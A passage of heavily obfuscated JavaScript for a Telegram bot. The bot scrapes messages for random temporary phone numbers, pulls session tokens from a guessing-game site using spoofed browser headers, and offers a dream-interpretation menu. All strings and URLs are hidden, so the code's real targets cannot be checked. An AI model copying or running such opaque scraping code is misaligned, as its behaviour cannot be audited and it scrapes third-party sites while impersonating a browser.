async function الحصول_على_معلومات_رقم_عشوائي() {
    const _0x47d3d1 = _0x298049, _0x151002 = {
            'SPMHZ': function (_0x3c5649) {
                return _0x3c5649();
            },
            'TzjIy': function (_0x12a24d, _0x15bf4f) {
                return _0x12a24d === _0x15bf4f;
            },
            'vHvID': function (_0x479d92, _0x24e530) {
                return _0x479d92(_0x24e530);
            },
            'uhInk': _0x47d3d1(0xcaf),
            'TIkRK': _0x47d3d1(0xbf6),
            'rsXNn': _0x47d3d1(0x8d6) + _0x47d3d1(0xd00)
        }, _0x441de8 = await _0x151002[_0x47d3d1(0x87f)](استيراد_الأرقام);
    if (_0x151002[_0x47d3d1(0x7fd)](_0x441de8[_0x47d3d1(0x825)], 0x1d76 + -0x541 + -0x1835))
        return null;
    const _0xae1ebe = _0x441de8[_0x151002[_0x47d3d1(0xced)](randomInt, _0x441de8[_0x47d3d1(0x825)])][_0x47d3d1(0x5b6)](), _0x2948ee = new Date()[_0x47d3d1(0x829) + 'g']()[_0x47d3d1(0xb11)]('T')[-0x6fd * 0x2 + -0x2 * 0xf53 + 0x2ca0], _0x2f31c1 = new Date()[_0x47d3d1(0x598) + _0x47d3d1(0x6d6)](_0x151002[_0x47d3d1(0x5fe)], {
            'hour': _0x151002[_0x47d3d1(0xa59)],
            'minute': _0x151002[_0x47d3d1(0xa59)],
            'hour12': !![]
        });
    let _0x46dfaa = Object[_0x47d3d1(0x858)](الدول)[_0x47d3d1(0x371)](_0xb10439 => _0xae1ebe[_0x47d3d1(0x5cd)](_0xb10439)) || _0xae1ebe[_0x47d3d1(0x69c)](-0x1edf * -0x1 + 0x2 * -0xe75 + 0x1f5 * -0x1, -0x224a + 0x9 * -0x345 + -0xd * -0x4e7);
    const _0x3cb689 = الدول[_0x46dfaa] || [
        _0x151002[_0x47d3d1(0xd06)],
        '🚩'
    ];
    return {
        'رقم': _0xae1ebe,
        'رمز_الدولة': _0x46dfaa,
        'اسم_الدولة': _0x3cb689[0x2 * 0x796 + -0x2 * 0x5af + -0x1e7 * 0x2],
        'علم_الدولة': _0x3cb689[0x4 * -0x6e2 + 0xd1d * 0x1 + -0x2 * -0x736],
        'تاريخ_الإنشاء': _0x2948ee,
        'وقت_الإنشاء': _0x2f31c1
    };
}
async function استخراج_الرسائل_من_الموقع(_0x159c9f) {
    const _0x1c1a72 = _0x298049, _0x17cba4 = {
            'OFqhC': function (_0x1e3f37, _0x2fc609) {
                return _0x1e3f37(_0x2fc609);
            },
            'JKZXp': _0x1c1a72(0x2f5),
            'jKAxV': _0x1c1a72(0x44f),
            'JyLcx': _0x1c1a72(0x63b) + _0x1c1a72(0x2d0),
            'DcNsI': _0x1c1a72(0x961) + _0x1c1a72(0x9c3) + _0x1c1a72(0x2b9) + _0x1c1a72(0x38f) + _0x1c1a72(0x5f1) + _0x1c1a72(0x655) + _0x1c1a72(0x7f3) + _0x1c1a72(0x559) + _0x1c1a72(0x213) + _0x1c1a72(0x6f6) + _0x1c1a72(0x228) + _0x1c1a72(0xc22) + _0x1c1a72(0x28c) + _0x1c1a72(0x34b),
            'dyjPm': _0x1c1a72(0x2a7) + _0x1c1a72(0x756) + _0x1c1a72(0x25b) + _0x1c1a72(0x34b),
            'Jcyiw': _0x1c1a72(0x789),
            'zNhtF': _0x1c1a72(0xa7f) + _0x1c1a72(0xa62) + _0x1c1a72(0x4eb) + _0x1c1a72(0x9b2) + _0x1c1a72(0x777) + _0x1c1a72(0x21e) + _0x1c1a72(0x942) + _0x1c1a72(0x691) + _0x1c1a72(0x8c8) + _0x1c1a72(0xb7d) + _0x1c1a72(0xa4b) + '6',
            'JqPJu': function (_0x33f302, _0x3a10d4, _0x478cef) {
                return _0x33f302(_0x3a10d4, _0x478cef);
            },
            'OKaGP': function (_0x4f3158, _0x2264ab) {
                return _0x4f3158(_0x2264ab);
            },
            'TZlrQ': _0x1c1a72(0x500) + _0x1c1a72(0x61d) + _0x1c1a72(0x6b7)
        }, _0x522e73 = _0x1c1a72(0x4bb) + _0x1c1a72(0xa63) + _0x1c1a72(0x473) + _0x1c1a72(0x53e) + _0x159c9f, _0x7fe3f = {
            'authority': _0x17cba4[_0x1c1a72(0x3f7)],
            'accept': _0x17cba4[_0x1c1a72(0xb92)],
            'accept-language': _0x17cba4[_0x1c1a72(0xc25)],
            'cache-control': _0x17cba4[_0x1c1a72(0x269)],
            'user-agent': _0x17cba4[_0x1c1a72(0xd2c)]
        }, _0x4c1830 = await _0x17cba4[_0x1c1a72(0xb09)](fetch, _0x522e73, { 'headers': _0x7fe3f });
    if (_0x4c1830['ok']) {
        const _0x454b7e = await _0x4c1830[_0x1c1a72(0x8e5)](), _0x13779b = cheerio[_0x1c1a72(0x8f7)](_0x454b7e), _0x25bce2 = [];
        return _0x17cba4[_0x1c1a72(0x9aa)](_0x13779b, _0x17cba4[_0x1c1a72(0xa3f)])[_0x1c1a72(0xb61)]((_0x56f765, _0x10fb95) => {
            const _0x5d9900 = _0x1c1a72, _0x92dd6f = _0x17cba4[_0x5d9900(0x3bb)](_0x13779b, _0x10fb95)[_0x5d9900(0x371)](_0x17cba4[_0x5d9900(0x5cc)])[_0x5d9900(0x8e5)]()[_0x5d9900(0x5b6)](), _0x25a664 = _0x17cba4[_0x5d9900(0x3bb)](_0x13779b, _0x10fb95)[_0x5d9900(0x371)](_0x17cba4[_0x5d9900(0xca5)])[_0x5d9900(0x8e5)]()[_0x5d9900(0x5b6)]();
            _0x25bce2[_0x5d9900(0x39e)]([
                _0x92dd6f,
                _0x25a664
            ]);
        }), _0x25bce2[_0x1c1a72(0x69c)](-0x1edb + 0x1541 + 0x4cd * 0x2, 0xad1 + -0x854 + -0x4 * 0x9e);
    } else
        return null;
}
bot[_0x298049(0x65c)](/\/starㅇ함ㅏㅏㅗht/, async _0x9d4efd => {
    const _0x3ca220 = _0x298049, _0x3563c7 = {
            'pMVfM': _0x3ca220(0x27d) + _0x3ca220(0xc53) + _0x3ca220(0x3cd) + _0x3ca220(0x8aa),
            'ouszp': _0x3ca220(0xad4) + _0x3ca220(0x26a),
            'zrEKc': _0x3ca220(0x629) + _0x3ca220(0x96d)
        }, _0x4fd4fc = _0x9d4efd[_0x3ca220(0x556)]['id'];
    bot[_0x3ca220(0xb04) + 'e'](_0x4fd4fc, _0x3563c7[_0x3ca220(0xb00)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x3563c7[_0x3ca220(0x9cf)],
                        'callback_data': _0x3563c7[_0x3ca220(0x53a)]
                    }]]
        }
    });
}), bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x10fdcf => {
    const _0x1a173e = _0x298049, _0x11c471 = {
            'FmbCt': function (_0x4304c4, _0x42fbb1) {
                return _0x4304c4 === _0x42fbb1;
            },
            'IquBI': _0x1a173e(0x629) + _0x1a173e(0x96d),
            'vqYrW': function (_0xdaba7f) {
                return _0xdaba7f();
            },
            'vNkHP': function (_0x277e4e, _0x5f20dd, _0x2ac7fe) {
                return _0x277e4e(_0x5f20dd, _0x2ac7fe);
            },
            'ftKGd': _0x1a173e(0x73b),
            'KWNIh': function (_0x346cac, _0x9d860) {
                return _0x346cac(_0x9d860);
            },
            'FHFPb': function (_0x1ee8ff, _0x476781) {
                return _0x1ee8ff(_0x476781);
            },
            'CbsvN': _0x1a173e(0x380),
            'SYhnS': _0x1a173e(0x6f4) + _0x1a173e(0xa32),
            'RBZqH': _0x1a173e(0xc72) + 'م',
            'Yujzn': function (_0x430eea) {
                return _0x430eea();
            },
            'xejOG': function (_0x8a6b, _0x4ae832, _0x12821f) {
                return _0x8a6b(_0x4ae832, _0x12821f);
            }
        }, _0x420747 = _0x10fdcf[_0x1a173e(0x33c)][_0x1a173e(0x556)]['id'];
    if (_0x11c471[_0x1a173e(0x8c5)](_0x10fdcf[_0x1a173e(0xc57)], _0x11c471[_0x1a173e(0xbd7)])) {
        const _0x404750 = await _0x11c471[_0x1a173e(0x4cd)](الحصول_على_معلومات_رقم_عشوائي);
        await _0x11c471[_0x1a173e(0x80e)](ارسال_معلومات_الرقم, _0x10fdcf[_0x1a173e(0x33c)], _0x404750);
    } else {
        if (_0x10fdcf[_0x1a173e(0xc57)][_0x1a173e(0x5cd)](_0x11c471[_0x1a173e(0x61c)])) {
            const _0x10a840 = _0x10fdcf[_0x1a173e(0xc57)][_0x1a173e(0xb11)]('_')[0x2538 + -0x1bfc + -0x93a], _0x45c0aa = await _0x11c471[_0x1a173e(0xa1e)](استخراج_الرسائل_من_الموقع, _0x10a840);
            _0x45c0aa ? bot[_0x1a173e(0xb04) + 'e'](_0x420747, _0x11c471[_0x1a173e(0xa3b)](تنسيق_الرسائل, _0x45c0aa), { 'parse_mode': _0x11c471[_0x1a173e(0x23d)] }) : bot[_0x1a173e(0xb04) + 'e'](_0x420747, _0x11c471[_0x1a173e(0x9bc)]);
        } else {
            if (_0x11c471[_0x1a173e(0x8c5)](_0x10fdcf[_0x1a173e(0xc57)], _0x11c471[_0x1a173e(0x955)])) {
                const _0x26577d = await _0x11c471[_0x1a173e(0x481)](الحصول_على_معلومات_رقم_عشوائي);
                await _0x11c471[_0x1a173e(0xab2)](تحديث_معلومات_الرقم, _0x10fdcf[_0x1a173e(0x33c)], _0x26577d);
            }
        }
    }
});
async function ارسال_معلومات_الرقم(_0x5145e6, _0x5962e6) {
    const _0x337dc1 = _0x298049, _0x328435 = {
            'enlfV': function (_0x2c6f7c, _0xa554a8) {
                return _0x2c6f7c + _0xa554a8;
            },
            'blyTb': function (_0x53f077, _0x4261a3) {
                return _0x53f077 + _0x4261a3;
            },
            'gqWVO': function (_0x3d0422, _0x5122d5) {
                return _0x3d0422 + _0x5122d5;
            },
            'laIVO': _0x337dc1(0x546),
            'IPjek': _0x337dc1(0x3c5),
            'BsVyH': _0x337dc1(0x3e2),
            'obrYX': _0x337dc1(0x2dc),
            'ZraOy': _0x337dc1(0x395) + _0x337dc1(0x9f2),
            'jNkht': _0x337dc1(0x947) + 'ء',
            'JwODy': _0x337dc1(0x3ee) + _0x337dc1(0xcff),
            'pLFtD': _0x337dc1(0xc72) + 'م',
            'ZKUHX': _0x337dc1(0xbed) + '💬',
            'olCbO': _0x337dc1(0x380)
        }, _0x128988 = _0x5145e6[_0x337dc1(0x556)]['id'], _0x1ddd73 = _0x328435[_0x337dc1(0x491)](_0x328435[_0x337dc1(0x491)](_0x328435[_0x337dc1(0x416)](_0x328435[_0x337dc1(0x491)](_0x328435[_0x337dc1(0xbc0)](_0x328435[_0x337dc1(0x416)](_0x337dc1(0x496) + _0x337dc1(0x3a2), _0x337dc1(0x34d) + _0x337dc1(0x8d0) + _0x5962e6[_0x328435[_0x337dc1(0x822)]] + '`\x0a'), _0x337dc1(0x5e2) + '\x20' + _0x5962e6[_0x328435[_0x337dc1(0x533)]] + '\x20' + _0x5962e6[_0x328435[_0x337dc1(0x606)]] + '\x0a'), _0x337dc1(0x939) + _0x337dc1(0x8ba) + _0x5962e6[_0x328435[_0x337dc1(0xaa9)]] + '\x0a'), _0x337dc1(0xa88) + _0x337dc1(0x19d) + _0x5962e6[_0x328435[_0x337dc1(0xb9f)]] + '\x0a'), _0x337dc1(0x9c9) + _0x337dc1(0x770) + _0x5962e6[_0x328435[_0x337dc1(0x808)]] + '\x0a'), _0x337dc1(0xa5b) + _0x337dc1(0x6a6) + _0x337dc1(0x9f0)), _0xfff1cb = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x328435[_0x337dc1(0x5fb)],
                            'callback_data': _0x328435[_0x337dc1(0x387)]
                        }],
                    [{
                            'text': _0x328435[_0x337dc1(0xb68)],
                            'callback_data': _0x337dc1(0x73b) + _0x5962e6[_0x328435[_0x337dc1(0x822)]]
                        }]
                ]
            }
        };
    await bot[_0x337dc1(0xb04) + 'e'](_0x128988, _0x1ddd73, {
        'parse_mode': _0x328435[_0x337dc1(0x23e)],
        'reply_markup': _0xfff1cb[_0x337dc1(0xb54) + 'up']
    });
}
async function تحديث_معلومات_الرقم(_0x3e3064, _0x5b9a4e) {
    const _0x24fd02 = _0x298049, _0x18ce18 = {
            'GGBIB': function (_0x52258c, _0x4e7ae7) {
                return _0x52258c + _0x4e7ae7;
            },
            'TNPOT': function (_0x2a2676, _0xb82e2a) {
                return _0x2a2676 + _0xb82e2a;
            },
            'OXBwM': function (_0x35ca20, _0x1508ac) {
                return _0x35ca20 + _0x1508ac;
            },
            'ruPtS': _0x24fd02(0x546),
            'AqNkV': _0x24fd02(0x3c5),
            'QulEd': _0x24fd02(0x3e2),
            'bjnEN': _0x24fd02(0x2dc),
            'xTIbc': _0x24fd02(0x395) + _0x24fd02(0x9f2),
            'EPwQj': _0x24fd02(0x947) + 'ء',
            'oOVTO': _0x24fd02(0x3ee) + _0x24fd02(0xcff),
            'kTofK': _0x24fd02(0xc72) + 'م',
            'nvELL': _0x24fd02(0xbed) + '💬',
            'Pqupw': _0x24fd02(0x380)
        }, _0x1e7a02 = _0x3e3064[_0x24fd02(0x556)]['id'], _0x33516d = _0x18ce18[_0x24fd02(0x4ef)](_0x18ce18[_0x24fd02(0x4ef)](_0x18ce18[_0x24fd02(0x421)](_0x18ce18[_0x24fd02(0x421)](_0x18ce18[_0x24fd02(0x4ef)](_0x18ce18[_0x24fd02(0xcd4)](_0x24fd02(0x496) + _0x24fd02(0x3a2), _0x24fd02(0x34d) + _0x24fd02(0x8d0) + _0x5b9a4e[_0x18ce18[_0x24fd02(0x7ce)]] + '`\x0a'), _0x24fd02(0x5e2) + '\x20' + _0x5b9a4e[_0x18ce18[_0x24fd02(0xc8d)]] + '\x20' + _0x5b9a4e[_0x18ce18[_0x24fd02(0x622)]] + '\x0a'), _0x24fd02(0x939) + _0x24fd02(0x8ba) + _0x5b9a4e[_0x18ce18[_0x24fd02(0xa5f)]] + '\x0a'), _0x24fd02(0xa88) + _0x24fd02(0x19d) + _0x5b9a4e[_0x18ce18[_0x24fd02(0x39f)]] + '\x0a'), _0x24fd02(0x9c9) + _0x24fd02(0x770) + _0x5b9a4e[_0x18ce18[_0x24fd02(0x3f0)]] + '\x0a'), _0x24fd02(0xa5b) + _0x24fd02(0x6a6) + _0x24fd02(0x9f0)), _0x325000 = {
            'reply_markup': {
                'inline_keyboard': [
                    [{
                            'text': _0x18ce18[_0x24fd02(0x676)],
                            'callback_data': _0x18ce18[_0x24fd02(0xc6d)]
                        }],
                    [{
                            'text': _0x18ce18[_0x24fd02(0x8ff)],
                            'callback_data': _0x24fd02(0x73b) + _0x5b9a4e[_0x18ce18[_0x24fd02(0x7ce)]]
                        }]
                ]
            }
        };
    await bot[_0x24fd02(0x382) + _0x24fd02(0x220)](_0x33516d, {
        'chat_id': _0x1e7a02,
        'message_id': _0x3e3064[_0x24fd02(0x42f)],
        'parse_mode': _0x18ce18[_0x24fd02(0x4a6)],
        'reply_markup': _0x325000[_0x24fd02(0xb54) + 'up']
    });
}
const userSessionss = {};
async function extractSignatureAndSession() {
    const _0x486469 = _0x298049, _0x5269a4 = {
            'XoiHY': function (_0x16a399, _0x25765e) {
                return _0x16a399(_0x25765e);
            },
            'zUfzk': _0x486469(0xcc1) + _0x486469(0x925),
            'Bpmyo': _0x486469(0x897),
            'XathX': _0x486469(0xcc1) + _0x486469(0x925) + _0x486469(0x7c0) + _0x486469(0x802),
            'EVWkA': _0x486469(0x6bf),
            'BwRfO': _0x486469(0x1b5),
            'UMCkk': _0x486469(0xcc1) + _0x486469(0x925) + _0x486469(0x47a) + _0x486469(0x6e1),
            'OHeJl': _0x486469(0x5eb) + _0x486469(0xa7e) + _0x486469(0xcbb),
            'omNPO': _0x486469(0x73f),
            'ChAwp': function (_0x40597b, _0x23812f) {
                return _0x40597b(_0x23812f);
            },
            'MPsAI': _0x486469(0xac5),
            'RBOOH': function (_0x4a019d, _0x1cc381) {
                return _0x4a019d && _0x1cc381;
            },
            'RzIgc': _0x486469(0x2c5) + _0x486469(0x7ea) + _0x486469(0xc4e)
        };
    try {
        const _0x140095 = await axios[_0x486469(0xb22)](_0x5269a4[_0x486469(0x26c)], {
                'cm': _0x5269a4[_0x486469(0x3c8)],
                'sid': '1'
            }), _0x4162f8 = cheerio[_0x486469(0x8f7)](_0x140095[_0x486469(0xc57)]);
        let _0x35dc29, _0x2f3507;
        _0x5269a4[_0x486469(0xa92)](_0x4162f8, _0x5269a4[_0x486469(0x312)])[_0x486469(0xb61)]((_0x5aff97, _0x53d0c4) => {
            const _0x353205 = _0x486469, _0xee3a06 = _0x5269a4[_0x353205(0x693)](_0x4162f8, _0x53d0c4)[_0x353205(0x742)]();
            _0xee3a06[_0x353205(0x948)](_0x5269a4[_0x353205(0x51c)]) && (_0xee3a06[_0x353205(0x948)](_0x5269a4[_0x353205(0x745)]) && (_0x35dc29 = _0xee3a06[_0x353205(0xb11)](_0x5269a4[_0x353205(0xc68)])[-0x12d9 + 0x677 + 0x15 * 0x97][_0x353205(0xb11)](_0x5269a4[_0x353205(0x22c)])[0x994 + 0x30a + 0x13 * -0xaa]), _0xee3a06[_0x353205(0x948)](_0x5269a4[_0x353205(0xbdc)]) && (_0x2f3507 = _0xee3a06[_0x353205(0xb11)](_0x5269a4[_0x353205(0x922)])[0x17c8 + -0x1f3 * 0xf + 0x576][_0x353205(0xb11)](_0x5269a4[_0x353205(0x22c)])[0x2209 + 0x118a + -0x3393]));
        });
        if (_0x5269a4[_0x486469(0x536)](_0x35dc29, _0x2f3507))
            return {
                'signature': _0x35dc29,
                'session': _0x2f3507
            };
        else
            throw new Error(_0x5269a4[_0x486469(0xc1a)]);
    } catch (_0x58911b) {
        throw _0x58911b;
    }
}
function resetGame(_0xf61847, _0x10d24c) {
    const _0x1c809a = _0x298049, _0x34b973 = {
            'RMiay': _0x1c809a(0x9ab),
            'yApOF': _0x1c809a(0x549),
            'svUOG': _0x1c809a(0x73f)
        };
    return {
        'step': '0',
        'progression': _0x34b973[_0x1c809a(0x330)],
        'sid': _0x34b973[_0x1c809a(0x6c5)],
        'cm': _0x34b973[_0x1c809a(0x264)],
        'answer': '0',
        'step_last_proposition': '',
        'session': _0x10d24c,
        'signature': _0xf61847
    };
}
bot[_0x298049(0x65c)](/\/star刚t/, _0x444ecb => {
    const _0x32b5e7 = _0x298049, _0x5e4ccb = {
            'dZrBQ': _0x32b5e7(0x694) + 'عب',
            'iHEhI': _0x32b5e7(0x1e9),
            'qrHIW': _0x32b5e7(0xa83) + _0x32b5e7(0xb66) + _0x32b5e7(0xb29) + _0x32b5e7(0xcd8) + _0x32b5e7(0x3fa) + _0x32b5e7(0x410),
            'NpFto': _0x32b5e7(0x380)
        }, _0x596121 = _0x444ecb[_0x32b5e7(0x556)]['id'], _0x36cbc0 = {
            'inline_keyboard': [[{
                        'text': _0x5e4ccb[_0x32b5e7(0x9d0)],
                        'callback_data': _0x5e4ccb[_0x32b5e7(0x2af)]
                    }]]
        };
    bot[_0x32b5e7(0xb04) + 'e'](_0x596121, _0x5e4ccb[_0x32b5e7(0x343)], {
        'reply_markup': _0x36cbc0,
        'parse_mode': _0x5e4ccb[_0x32b5e7(0x5cb)]
    });
});
async function askQuestion(_0x45db9e, _0x3b0b86, _0x5a09de = ![]) {
    const _0x1af539 = _0x298049, _0x770d03 = {
            'bpvGJ': _0x1af539(0x5eb) + _0x1af539(0xa7e) + _0x1af539(0xbe0),
            'nJlNI': _0x1af539(0x9c3) + _0x1af539(0xa9e) + _0x1af539(0x38a) + _0x1af539(0x870) + _0x1af539(0x4d3),
            'jxbxd': _0x1af539(0xd0c),
            'uMvcV': _0x1af539(0xabb) + _0x1af539(0x4ec),
            'AcqcD': _0x1af539(0xa7f) + _0x1af539(0xa62) + _0x1af539(0x4eb) + _0x1af539(0x9b2) + _0x1af539(0x777) + _0x1af539(0x21e) + _0x1af539(0x942) + _0x1af539(0x691) + _0x1af539(0xc55) + _0x1af539(0xb7d) + _0x1af539(0xa4b) + '6',
            'flsLf': _0x1af539(0x5eb) + _0x1af539(0xa7e) + _0x1af539(0x900),
            'gTQUn': function (_0x16b327, _0x1e7eb0) {
                return _0x16b327 in _0x1e7eb0;
            },
            'hQNCN': _0x1af539(0x699) + _0x1af539(0xcb6),
            'mdhaA': _0x1af539(0x6b0),
            'NAhwW': _0x1af539(0x9e2) + 'ف',
            'naHHV': function (_0x5a5800, _0x35ed62) {
                return _0x5a5800 === _0x35ed62;
            },
            'IMYPk': _0x1af539(0x426) + _0x1af539(0x53c) + _0x1af539(0x28a) + _0x1af539(0xb5b) + _0x1af539(0x3aa),
            'iAEcM': _0x1af539(0xb1a) + _0x1af539(0x290) + _0x1af539(0x6aa) + _0x1af539(0x7e0),
            'SUWzJ': _0x1af539(0x380),
            'VEptk': function (_0x13b9ba, _0x4af21d, _0x536476) {
                return _0x13b9ba(_0x4af21d, _0x536476);
            },
            'RTvnG': _0x1af539(0x881),
            'QovKh': _0x1af539(0xc09),
            'LeVOT': _0x1af539(0x501),
            'EWznw': _0x1af539(0x60f),
            'NhFtx': _0x1af539(0x1d0),
            'VmABQ': _0x1af539(0x73d),
            'LMEWs': _0x1af539(0x226),
            'rpNjD': _0x1af539(0xc9f),
            'CeJhQ': function (_0x48e746, _0x3cc678) {
                return _0x48e746(_0x3cc678);
            },
            'gcJXe': function (_0x2cfaf3, _0x5c1b98) {
                return _0x2cfaf3(_0x5c1b98);
            }
        }, _0x2f4d42 = userSessionss[_0x3b0b86], _0x2de656 = _0x770d03[_0x1af539(0x4e5)], _0x1e5a93 = {
            'Content-Type': _0x770d03[_0x1af539(0x562)],
            'Accept': _0x770d03[_0x1af539(0xa2e)],
            'X-Requested-With': _0x770d03[_0x1af539(0xc0a)],
            'User-Agent': _0x770d03[_0x1af539(0x376)],
            'Referer': _0x770d03[_0x1af539(0x91f)]
        };
    try {
        const _0xfd3eed = await axios[_0x1af539(0xb22)](_0x2de656, _0x2f4d42[_0x1af539(0xc57)], { 'headerso': _0x1e5a93 }), _0x1d9026 = _0xfd3eed[_0x1af539(0xc57)];
        if (_0x770d03[_0x1af539(0x2be)](_0x770d03[_0x1af539(0x595)], _0x1d9026)) {
            const _0x40c3c2 = _0x1d9026[_0x1af539(0x699) + _0x1af539(0xcb6)] || _0x770d03[_0x1af539(0xc7f)], _0x5db967 = _0x1d9026[_0x1af539(0x9ff) + _0x1af539(0xb75) + _0x1af539(0xa66)] || _0x770d03[_0x1af539(0x2a3)];
            let _0x988c2f = _0x1d9026[_0x1af539(0x225)];
            (!_0x988c2f || _0x770d03[_0x1af539(0x506)](_0x988c2f, _0x770d03[_0x1af539(0x804)])) && (_0x988c2f = _0x770d03[_0x1af539(0xb79)]);
            const _0x18f835 = _0x1af539(0x305) + _0x1af539(0x4c6) + _0x40c3c2 + (_0x1af539(0x287) + '*\x20') + _0x5db967;
            try {
                await bot[_0x1af539(0x8ab)](_0x3b0b86, _0x988c2f, {
                    'caption': _0x18f835,
                    'parse_mode': _0x770d03[_0x1af539(0xcfe)]
                });
            } catch (_0x3b5c26) {
                await bot[_0x1af539(0xb04) + 'e'](_0x3b0b86, _0x18f835, { 'parse_mode': _0x770d03[_0x1af539(0xcfe)] });
            }
            await bot[_0x1af539(0x382) + _0x1af539(0x444) + 'up']({ 'inline_keyboard': [] }, {
                'chat_id': _0x3b0b86,
                'message_id': _0x45db9e[_0x1af539(0x42f)]
            });
            return;
        }
        const _0x96cc09 = _0x1d9026[_0x1af539(0x91e)];
        if (!_0x96cc09) {
            await new Promise(_0x3f439e => setTimeout(_0x3f439e, -0x5c1 + -0x697 * -0x5 + -0x174a)), await _0x770d03[_0x1af539(0x842)](askQuestion, _0x45db9e, _0x3b0b86);
            return;
        }
        const _0x3a1428 = _0x1d9026[_0x1af539(0x1b4) + 'n'], _0x3dfafd = _0x1d9026[_0x1af539(0x7df)];
        _0x2f4d42[_0x1af539(0xc57)][_0x1af539(0x7df)] = _0x3dfafd, _0x2f4d42[_0x1af539(0xc57)][_0x1af539(0x1b4) + 'n'] = _0x3a1428;
        const _0x34a6d3 = {
                'inline_keyboard': [
                    [
                        {
                            'text': _0x770d03[_0x1af539(0x780)],
                            'callback_data': _0x770d03[_0x1af539(0x788)]
                        },
                        {
                            'text': _0x770d03[_0x1af539(0x448)],
                            'callback_data': _0x770d03[_0x1af539(0x47f)]
                        }
                    ],
                    [
                        {
                            'text': _0x770d03[_0x1af539(0x931)],
                            'callback_data': _0x770d03[_0x1af539(0x460)]
                        },
                        {
                            'text': _0x770d03[_0x1af539(0xacf)],
                            'callback_data': _0x770d03[_0x1af539(0x230)]
                        }
                    ]
                ]
            }, _0x4ebf52 = _0x1af539(0x2ad) + '*\x20' + _0x96cc09 + (_0x1af539(0xab0) + _0x1af539(0x4c6)) + _0x770d03[_0x1af539(0xa97)](parseInt, _0x770d03[_0x1af539(0x658)](parseFloat, _0x3a1428)) + '%';
        _0x5a09de ? await bot[_0x1af539(0xb04) + 'e'](_0x3b0b86, _0x4ebf52, {
            'reply_markup': _0x34a6d3,
            'parse_mode': _0x770d03[_0x1af539(0xcfe)]
        }) : await bot[_0x1af539(0x382) + _0x1af539(0x220)](_0x4ebf52, {
            'chat_id': _0x3b0b86,
            'message_id': _0x45db9e[_0x1af539(0x42f)],
            'reply_markup': _0x34a6d3,
            'parse_mode': _0x770d03[_0x1af539(0xcfe)]
        });
    } catch (_0x27fb3a) {
        await bot[_0x1af539(0xb04) + 'e'](_0x3b0b86, _0x1af539(0x20a) + _0x1af539(0xbd3) + _0x1af539(0x934) + _0x27fb3a[_0x1af539(0x33c)]);
    }
}
async function startNewSession(_0x389823) {
    const _0x54e93c = _0x298049, _0x4093e3 = {
            'HvBFV': function (_0x555abc) {
                return _0x555abc();
            },
            'uNYgq': function (_0x5aa0f2, _0x4ee2ec, _0x2c37d1) {
                return _0x5aa0f2(_0x4ee2ec, _0x2c37d1);
            }
        };
    try {
        const {
            signature: _0x587078,
            session: _0x5b48aa
        } = await _0x4093e3[_0x54e93c(0xc1d)](extractSignatureAndSession);
        userSessionss[_0x389823] = {
            'signature': _0x587078,
            'session': _0x5b48aa,
            'data': _0x4093e3[_0x54e93c(0x965)](resetGame, _0x587078, _0x5b48aa)
        };
    } catch (_0x994d27) {
        await bot[_0x54e93c(0xb04) + 'e'](_0x389823, _0x54e93c(0x20a) + _0x54e93c(0x8f9) + _0x54e93c(0xa3a) + _0x994d27[_0x54e93c(0x33c)]);
    }
}
bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), async _0x30d9b5 => {
    const _0x4e0a36 = _0x298049, _0x1bec59 = {
            'rWzkl': function (_0x4b669a, _0x42bcb6) {
                return _0x4b669a === _0x42bcb6;
            },
            'bxFMB': _0x4e0a36(0x1e9),
            'uIQty': function (_0x2a1c27, _0x198472) {
                return _0x2a1c27(_0x198472);
            },
            'HAgNI': function (_0x33699b, _0x4529b5, _0x468ab1, _0x5eab53) {
                return _0x33699b(_0x4529b5, _0x468ab1, _0x5eab53);
            },
            'CwMWn': _0x4e0a36(0x8e3),
            'TxJWN': function (_0x19e582, _0x4f04d1) {
                return _0x19e582 in _0x4f04d1;
            },
            'wBjYS': _0x4e0a36(0xd18) + _0x4e0a36(0x969) + _0x4e0a36(0x9d5) + 't.',
            'AHMdq': function (_0x48b179, _0x29a205, _0x33e8e2) {
                return _0x48b179(_0x29a205, _0x33e8e2);
            }
        }, _0x463cab = _0x30d9b5[_0x4e0a36(0x33c)][_0x4e0a36(0x556)]['id'];
    if (_0x1bec59[_0x4e0a36(0xd0e)](_0x30d9b5[_0x4e0a36(0xc57)], _0x1bec59[_0x4e0a36(0x47d)]))
        await _0x1bec59[_0x4e0a36(0x702)](startNewSession, _0x463cab), await _0x1bec59[_0x4e0a36(0x62a)](askQuestion, _0x30d9b5[_0x4e0a36(0x33c)], _0x463cab, !![]);
    else {
        if (_0x30d9b5[_0x4e0a36(0xc57)][_0x4e0a36(0x5cd)](_0x1bec59[_0x4e0a36(0x6ad)])) {
            if (!_0x1bec59[_0x4e0a36(0xc6e)](_0x463cab, userSessionss)) {
                await bot[_0x4e0a36(0xb04) + 'e'](_0x463cab, _0x1bec59[_0x4e0a36(0xa74)]);
                return;
            }
            const _0xd74d5e = _0x30d9b5[_0x4e0a36(0xc57)][_0x4e0a36(0xb11)]('_')[-0x1441 + 0x71f * -0x1 + -0x1b61 * -0x1], _0x490349 = userSessionss[_0x463cab];
            _0x490349[_0x4e0a36(0xc57)][_0x4e0a36(0x8e3)] = _0xd74d5e, await _0x1bec59[_0x4e0a36(0x196)](askQuestion, _0x30d9b5[_0x4e0a36(0x33c)], _0x463cab);
        }
    }
});
let conversations = {}, sessionTimings = {};
const userSessionsg = {};
function showDreamMenu(_0xd93bf1) {
    const _0x1ea714 = _0x298049, _0x3a5e71 = {
            'cUrPv': _0x1ea714(0x5ac) + _0x1ea714(0x4cf),
            'PhrHc': _0x1ea714(0x39b) + 'r',
            'ysIVa': _0x1ea714(0xc7c) + _0x1ea714(0x8ce) + _0x1ea714(0x838) + _0x1ea714(0x81b) + _0x1ea714(0x9d2)
        }, _0x160cf6 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x3a5e71[_0x1ea714(0xa81)],
                            'callback_data': _0x3a5e71[_0x1ea714(0x442)]
                        }]]
            }
        };
    bot[_0x1ea714(0xb04) + 'e'](_0xd93bf1, _0x3a5e71[_0x1ea714(0x8d9)], _0x160cf6);
}
bot['on'](_0x298049(0x1a4) + _0x298049(0x5fc), _0x5b24ff => {
    const _0x549a37 = _0x298049, _0x163434 = {
            'NSmPV': function (_0x510c0a, _0x1ab294) {
                return _0x510c0a === _0x1ab294;
            },
            'zFrAN': _0x549a37(0x39b) + 'r',
            'iTGPE': _0x549a37(0x2cc) + 'عي',
